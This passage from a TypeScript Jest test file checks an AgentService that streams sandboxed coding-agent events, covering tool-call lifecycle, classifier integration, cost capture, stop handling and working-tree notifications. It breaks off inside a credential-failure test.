/**
 * @jest-environment node
 *
 * Story 6.3: Migrate AgentService to Sandbox-Based Execution
 * Unit tests for the REAL AgentService (not AgentServiceFake).
 *
 * Tests the full AG-UI tool call lifecycle, classifier integration, cost
 * capture, concurrent-turn guard, and stop/onModuleDestroy delegation by
 * mocking AguiEventBridgeService.streamAgentEvents and feeding AG-UI events
 * through the onEvent callback.
 *
 * Story 6.3 covers: AC-1 (runTurn launches sandbox-agent via event bridge),
 *                   AC-3 (stop terminates via event bridge),
 *                   AC-4 (host-based SDK code removed),
 *                   AC-6 (circuit breaker delegated to event bridge),
 *                   AC-7 (preserved behaviors — tool calls, classifier, etc.),
 *                   AC-8 (cost capture from RUN_FINISHED data payload).
 *
 * Previous stories (3.4, 3.7, 3.8, 3.11, 5.5) tested the same behaviors via
 * SDK query() mocks — those tests were rewritten when the host-based SDK code
 * was removed (Story 6.3 Task 7.1). The test coverage remains equivalent:
 * tool-call lifecycle, classifier integration, cost recording, concurrent-turn
 * guard, segments persistence.
 */
import { SessionEventsService, type SseEvent } from './session-events.service';
import { AgentService } from './agent.service';
import type { SandboxServiceFake } from '../../test/helpers/sandbox-service.fake';
import type { MessageSegment } from '@bmad-easy/shared-types';
import { EventType } from '@ag-ui/core';

describe('AgentService (real — sandbox-based execution via AguiEventBridgeService)', () => {
  let sessionEvents: SessionEventsService;
  let agentService: AgentService;
  let sandboxFake: SandboxServiceFake;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  let mockPrisma: any;
  let mockClassifier: { classifyToolResult: jest.Mock };
  let mockCostTracking: { recordCost: jest.Mock };
  let mockEventBridge: { streamAgentEvents: jest.Mock; stop: jest.Mock };
  let emitSpy: jest.SpyInstance;

  beforeEach(() => {
    mockPrisma = {
      conversation: { update: jest.fn().mockResolvedValue({}) },
      turn: { create: jest.fn().mockResolvedValue({ id: 'turn-1' }) },
    };

    sandboxFake = {
      getWorkingTreeStatus: jest.fn().mockResolvedValue({ dirty: false, files: [] }),
    } as unknown as SandboxServiceFake;

    sessionEvents = new SessionEventsService();
    emitSpy = jest.spyOn(sessionEvents, 'emit');

    mockClassifier = {
      classifyToolResult: jest.fn().mockResolvedValue(null),
    };

    mockCostTracking = {
      recordCost: jest.fn().mockResolvedValue(undefined),
    };

    mockEventBridge = {
      streamAgentEvents: jest.fn().mockResolvedValue(undefined),
      stop: jest.fn().mockResolvedValue(undefined),
    };

    jest.useFakeTimers();
  });

  afterEach(() => {
    jest.useRealTimers();
    jest.clearAllMocks();
    jest.restoreAllMocks();
  });

  function createAgentService(): AgentService {
    return new AgentService(
      sandboxFake as never,
      sessionEvents,
      mockPrisma,
      mockClassifier as never,
      mockCostTracking as never,
      mockEventBridge as never,
    );
  }

  // Helper: create a mock AguiEventBridgeService whose streamAgentEvents
  // captures the onEvent callback and invokes it with the given AG-UI
  // events before resolving. Non-lifecycle events are also forwarded to
  // sessionEvents.emit() — simulating the real event bridge behavior where
  // non-lifecycle events are both passed to onEvent AND emitted to SSE.
  const LIFECYCLE_EVENTS = new Set<string>([
    EventType.RUN_STARTED,
    EventType.RUN_FINISHED,
    EventType.RUN_ERROR,
  ]);

  function createMockEventBridge(events: SseEvent[]): {
    streamAgentEvents: jest.Mock;
    stop: jest.Mock;
    capturedOnEvent: () => ((event: SseEvent) => void) | undefined;
  } {
    let onEventCb: ((event: SseEvent) => void) | undefined;
    const streamAgentEvents = jest.fn(async (params: { conversationId?: string; onEvent?: (event: SseEvent) => void }) => {
      onEventCb = params.onEvent;
      const convId = params.conversationId ?? 'conv-1';
      for (const event of events) {
        onEventCb?.(event);
        // Simulate the real event bridge: non-lifecycle events are forwarded
        // to sessionEvents.emit() (lifecycle events are owned by AgentService).
        if (!LIFECYCLE_EVENTS.has(event.event)) {
          sessionEvents.emit(convId, event);
        }
      }
    });
    const stop = jest.fn().mockResolvedValue(undefined);
    return {
      streamAgentEvents,
      stop,
      capturedOnEvent: () => onEventCb,
    };
  }

  // Helper: a controllable mock AguiEventBridgeService whose `stop()`
  // rejects the in-flight `streamAgentEvents` promise with AGENT_STOPPED —
  // mirroring the real event bridge's stored-reject-handle behavior. Use this
  // for stop()/onModuleDestroy()/concurrent-guard tests so the full
  // stop→reject→runTurn-catch interaction is exercised AND no never-resolving
  // promise is left dangling (avoids Jest open-handle warnings).
  function createControllableEventBridge(): {
    streamAgentEvents: jest.Mock;
    stop: jest.Mock;
  } {
    // Per-conversation reject handle (mirrors the real bridge's activeRuns map)
    // so multiple concurrent runs are each rejectable independently.
    const rejectStreams = new Map<string, (err: Error) => void>();
    const streamAgentEvents = jest.fn(async (params: { conversationId?: string }) => {
      const convId = params.conversationId ?? 'conv-1';
      await new Promise<void>((_, reject) => {
        rejectStreams.set(convId, reject);
      });
    });
    const stop = jest.fn(async (conversationId: string) => {
      rejectStreams.get(conversationId)?.(new Error('AGENT_STOPPED'));
    });
    return { streamAgentEvents, stop };
  }

  // ─── AC-1, AC-7: runTurn uses AguiEventBridgeService ──────────────────

  describe('[P0] Story 6.3 — runTurn() uses AguiEventBridgeService (AC-1, AC-7)', () => {
    it('[P0] runTurn calls aguiEventBridgeService.streamAgentEvents with conversationId, sandboxId, userId, and onEvent callback (AC-1)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(bridge.streamAgentEvents).toHaveBeenCalledTimes(1);
      const params = bridge.streamAgentEvents.mock.calls[0][0];
      expect(params.conversationId).toBe('conv-1');
      expect(params.sandboxId).toBe('sb-1');
      expect(params.userId).toBe('user-1');
      expect(typeof params.onEvent).toBe('function');
    });

    it('[P0] runTurn emits RUN_STARTED before calling streamAgentEvents (AC-1, lifecycle ownership)', async () => {
      const bridge = createMockEventBridge([]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      // AgentService owns lifecycle emission — RUN_STARTED must be emitted
      // by AgentService, not forwarded from the event bridge.
      const startedCall = emitSpy.mock.calls.find(
        (c) => c[1]?.event === EventType.RUN_STARTED,
      );
      expect(startedCall).toBeDefined();

      // RUN_STARTED must be emitted BEFORE streamAgentEvents is called.
      const startedEmitOrder = emitSpy.mock.invocationCallOrder[
        emitSpy.mock.calls.indexOf(startedCall)
      ];
      const streamCallOrder = bridge.streamAgentEvents.mock.invocationCallOrder[0];
      expect(startedEmitOrder).toBeLessThan(streamCallOrder);
    });

    it('[P0] onEvent accumulates text from TEXT_MESSAGE_CONTENT events (AC-1, AC-7)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: ' world' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const assistantTurnCall = mockPrisma.turn.create.mock.calls.find(
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (call: any[]) => call[0]?.data?.role === 'assistant',
      );
      expect(assistantTurnCall).toBeDefined();
      expect(assistantTurnCall[0].data.content).toBe('Hello world');
    });

    it('[P0] onEvent builds tool_call segments from TOOL_CALL_START/ARGS/END/RESULT (AC-1, AC-7)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const assistantTurnCall = mockPrisma.turn.create.mock.calls.find(
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (call: any[]) => call[0]?.data?.role === 'assistant',
      );
      expect(assistantTurnCall).toBeDefined();
      const segments = assistantTurnCall[0].data.segments as MessageSegment[];
      const toolCallSeg = segments.find((s) => s.type === 'tool_call');
      expect(toolCallSeg).toBeDefined();
      expect(toolCallSeg).toHaveProperty('toolCall.toolCallId', 'tc-1');
      expect(toolCallSeg).toHaveProperty('toolCall.toolName', 'Bash');
      expect(toolCallSeg).toHaveProperty('toolCall.status', 'completed');
    });

    it('[P0] onEvent triggers classifier on TOOL_CALL_RESULT with toolName/input looked up from segment (AC-7)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(mockClassifier.classifyToolResult).toHaveBeenCalledWith(
        'tc-1',
        'Bash',
        expect.any(String),
        'nothing to commit',
        'user-1',
      );
    });

    it('[P0] onEvent captures cost data from RUN_FINISHED data payload (AC-8)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
        {
          event: EventType.RUN_FINISHED,
          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
        },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(mockCostTracking.recordCost).toHaveBeenCalledWith({
        userId: 'user-1',
        conversationId: 'conv-1',
        totalCostUsd: 0.42,
        sessionId: 'sess-1',
        numTurns: 3,
        durationMs: 5000,
      });
    });

    it('[P0] cost recording happens BEFORE RUN_FINISHED is emitted to SSE (AC-8, event ordering)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
        {
          event: EventType.RUN_FINISHED,
          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
        },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const recordCostOrder = mockCostTracking.recordCost.mock.invocationCallOrder[0];
      const finishedEmitCall = emitSpy.mock.calls.find(
        (c) => c[1]?.event === EventType.RUN_FINISHED,
      );
      expect(finishedEmitCall).toBeDefined();
      const finishedEmitOrder = emitSpy.mock.invocationCallOrder[
        emitSpy.mock.calls.indexOf(finishedEmitCall)
      ];
      expect(recordCostOrder).toBeLessThan(finishedEmitOrder);
    });

    it('[P0] runTurn emits RUN_FINISHED after streamAgentEvents resolves (AC-1, lifecycle ownership)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.RUN_STARTED, data: { threadId: 'conv-1' } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const finishedCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.RUN_FINISHED,
      );
      expect(finishedCalls).toHaveLength(1);
    });

    it('[P0] concurrent-turn guard: second runTurn on in-flight conversationId is rejected silently (AC-7)', async () => {
      const bridge = createControllableEventBridge();
      mockEventBridge = bridge;

      agentService = createAgentService();
      const firstRun = agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'first',
        userId: 'user-1',
      });
      // Attach catch early to prevent unhandled rejection.
      firstRun.catch(() => undefined);
      await jest.advanceTimersByTimeAsync(0);

      // Clear emissions from the first run's RUN_STARTED — the second run
      // should be silently rejected with no emissions of its own.
      emitSpy.mockClear();
      await expect(
        agentService.runTurn({
          conversationId: 'conv-1',
          sandboxId: 'sb-1',
          message: 'second',
          userId: 'user-1',
        }),
      ).resolves.toBeUndefined();

      // Silent rejection — no RUN_STARTED or RUN_ERROR emitted.
      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
      expect(emittedEvents).not.toContain(EventType.RUN_STARTED);
      expect(emittedEvents).not.toContain(EventType.RUN_ERROR);

      // Settle the in-flight first run so no never-resolving promise is left
      // dangling (avoids Jest open-handle warnings).
      await agentService.stop('conv-1');
      await firstRun;
    });

    it('[P0] streamAgentEvents rejection (non-AGENT_STOPPED) emits RUN_ERROR (AC-7)', async () => {
      const bridge = createMockEventBridge([]);
      bridge.streamAgentEvents.mockRejectedValueOnce(new Error('spawn failed: ENOENT'));
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
      expect(emittedEvents).toContain(EventType.RUN_ERROR);
      expect(emittedEvents).not.toContain(EventType.RUN_FINISHED);

      const errorCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.RUN_ERROR,
      );
      expect(errorCalls[0][1].data.message).toBe('spawn failed: ENOENT');
    });

    it('[P0] AGENT_STOPPED rejection skips RUN_ERROR — stop() handles RUN_FINISHED (AC-6)', async () => {
      const bridge = createMockEventBridge([]);
      bridge.streamAgentEvents.mockRejectedValueOnce(new Error('AGENT_STOPPED'));
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      // AGENT_STOPPED is a stop-initiated rejection — no RUN_ERROR.
      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
      expect(emittedEvents).not.toContain(EventType.RUN_ERROR);
    });

    it('[P0] AGENT_STREAM_TIMEOUT rejection skips RUN_ERROR — event bridge already emitted it (AC-6)', async () => {
      const bridge = createMockEventBridge([]);
      bridge.streamAgentEvents.mockRejectedValueOnce(new Error('AGENT_STREAM_TIMEOUT'));
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      // AGENT_STREAM_TIMEOUT — event bridge already emitted RUN_ERROR.
      const errorCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.RUN_ERROR,
      );
      expect(errorCalls).toHaveLength(0);
    });

    it('[P0] MODULE_DESTROYING rejection skips RUN_ERROR and RUN_FINISHED — module shutting down (AC-6)', async () => {
      // Generated by testarch-automate validation run (coverage gap: the third
      // sentinel branch in runTurn()'s catch block was untested). The other
      // two sentinels (AGENT_STOPPED, AGENT_STREAM_TIMEOUT) are tested above.
      const bridge = createMockEventBridge([]);
      bridge.streamAgentEvents.mockRejectedValueOnce(new Error('MODULE_DESTROYING'));
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      // MODULE_DESTROYING — module is shutting down; SSE clients are
      // disconnecting. Skip both RUN_ERROR and RUN_FINISHED.
      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
      expect(emittedEvents).not.toContain(EventType.RUN_ERROR);
      expect(emittedEvents).not.toContain(EventType.RUN_FINISHED);
    });
  });

  // ─── AC-1: Tool call lifecycle emission (preserved behavior) ──────────

  describe('[P0] AC-1 — Tool call lifecycle emission', () => {
    it('[P0] emits TOOL_CALL_START with toolCallName (not toolName)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const startCall = emitSpy.mock.calls.find(
        (c) => c[1]?.event === EventType.TOOL_CALL_START,
      );
      expect(startCall).toBeDefined();
      expect(startCall[1].data).toHaveProperty('toolCallName', 'Bash');
      expect(startCall[1].data).not.toHaveProperty('toolName');
    });

    it('[P0] emits TOOL_CALL_ARGS on input_json_delta', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"' } },
        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '}' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const argsCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.TOOL_CALL_ARGS,
      );
      expect(argsCalls.length).toBeGreaterThanOrEqual(2);
      expect(argsCalls[0][1].data).toHaveProperty('toolCallId', 'tc-1');
      expect(argsCalls[0][1].data).toHaveProperty('delta');
    });

    it('[P0] emits TOOL_CALL_END on TOOL_CALL_END event', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const endCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.TOOL_CALL_END,
      );
      expect(endCalls).toHaveLength(1);
      expect(endCalls[0][1].data).toHaveProperty('toolCallId', 'tc-1');
    });

    it('[P0] emits TOOL_CALL_RESULT on tool result event', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const resultCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.TOOL_CALL_RESULT,
      );
      expect(resultCalls).toHaveLength(1);
      expect(resultCalls[0][1].data).toHaveProperty('toolCallId', 'tc-1');
      expect(resultCalls[0][1].data).toHaveProperty('content', 'nothing to commit');
    });

    it('[P0] preserves error status when TOOL_CALL_RESULT isError is true', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'command failed', role: 'tool', isError: true } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(mockPrisma.turn.create).toHaveBeenCalledTimes(1);
      const persistedSegments = mockPrisma.turn.create.mock.calls[0][0].data.segments as MessageSegment[];
      const toolCallSeg = persistedSegments.find((s) => s.type === 'tool_call');
      expect(toolCallSeg).toBeDefined();
      expect(toolCallSeg).toHaveProperty('toolCall.status', 'error');
    });
  });

  // ─── AC-2: Classifier integration (preserved behavior) ───────────────

  describe('[P0] AC-2 — Classifier integration', () => {
    it('[P0] calls classifier on TOOL_CALL_RESULT', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: '1 file changed', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(mockClassifier.classifyToolResult).toHaveBeenCalledWith(
        'tc-1',
        'Bash',
        expect.any(String),
        '1 file changed',
        'user-1',
      );
    });

    it('[P0] emits TOOL_CALL_PROMOTED when classifier returns event', async () => {
      mockClassifier.classifyToolResult.mockResolvedValue({
        type: 'TOOL_CALL_PROMOTED',
        toolCallId: 'tc-1',
        artifactType: 'prd',
        artifactTitle: 'My PRD',
        artifactId: 'art-1',
        viewHref: '/artifacts?id=art-1',
      });

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: '1 file changed', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const promotedCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === 'TOOL_CALL_PROMOTED',
      );
      expect(promotedCalls).toHaveLength(1);
      expect(promotedCalls[0][1].data).toHaveProperty('artifactType', 'prd');
    });
  });

  // ─── AC-1: Working tree emission after file-modifying tool calls ──────

  describe('[P0] AC-1 — Working tree emission after file-modifying tool calls', () => {
    it('[P0] emits WORKING_TREE_DIRTY after a file-modifying tool call when tree is dirty', async () => {
      (sandboxFake.getWorkingTreeStatus as jest.Mock).mockResolvedValue({
        dirty: true,
        files: ['src/foo.ts'],
      });

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const dirtyEvents = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === 'WORKING_TREE_DIRTY',
      );
      expect(dirtyEvents).toHaveLength(1);
      expect(dirtyEvents[0][1].data).toEqual({ files: ['src/foo.ts'] });
    });

    it('[P0] emits WORKING_TREE_CLEAN after a file-modifying tool call when tree is clean', async () => {
      (sandboxFake.getWorkingTreeStatus as jest.Mock).mockResolvedValue({
        dirty: false,
        files: [],
      });

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const cleanEvents = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === 'WORKING_TREE_CLEAN',
      );
      expect(cleanEvents).toHaveLength(1);
    });

    it('[P0] does NOT emit working tree events after non-file-modifying tool calls (e.g. Read)', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Read', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File contents', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const dirtyEvents = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === 'WORKING_TREE_DIRTY',
      );
      const cleanEvents = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === 'WORKING_TREE_CLEAN',
      );
      expect(dirtyEvents).toHaveLength(0);
      expect(cleanEvents).toHaveLength(0);
    });

    it('[P0] working tree check failure does not crash the agent run (logger.warn, RUN_FINISHED still emits)', async () => {
      (sandboxFake.getWorkingTreeStatus as jest.Mock).mockRejectedValue(
        new Error('git status failed'),
      );

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      const warnSpy = jest.spyOn(agentService['logger'], 'warn');

      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const finishedEvents = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.RUN_FINISHED,
      );
      expect(finishedEvents).toHaveLength(1);
      expect(warnSpy).toHaveBeenCalledWith(
        expect.stringContaining('Working tree check failed'),
      );
    });

    it('[P1] working tree event arrives before RUN_FINISHED (event ordering)', async () => {
      (sandboxFake.getWorkingTreeStatus as jest.Mock).mockResolvedValue({
        dirty: true,
        files: ['src/foo.ts'],
      });

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Write', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'File written', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const events = emitSpy.mock.calls.map((c) => c[1].event);
      const dirtyIndex = events.indexOf('WORKING_TREE_DIRTY');
      const finishedIndex = events.indexOf(EventType.RUN_FINISHED);

      expect(dirtyIndex).toBeGreaterThan(-1);
      expect(finishedIndex).toBeGreaterThan(-1);
      expect(dirtyIndex).toBeLessThan(finishedIndex);
    });
  });

  // ─── Story 3.7: CREDENTIAL_FAILURE / ACCESS_DENIED event emission ────

  describe('[P0] Story 3.7 — CREDENTIAL_FAILURE / ACCESS_DENIED event emission', () => {
    it('[P0] emits CREDENTIAL_FAILURE on the SSE channel when classifier returns CredentialFailureEvent', async () => {
      mockClassifier.classifyToolResult.mockResolvedValue({
        type: 'CREDENTIAL_FAILURE',
        toolCallId: 'tc-1',
      });

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
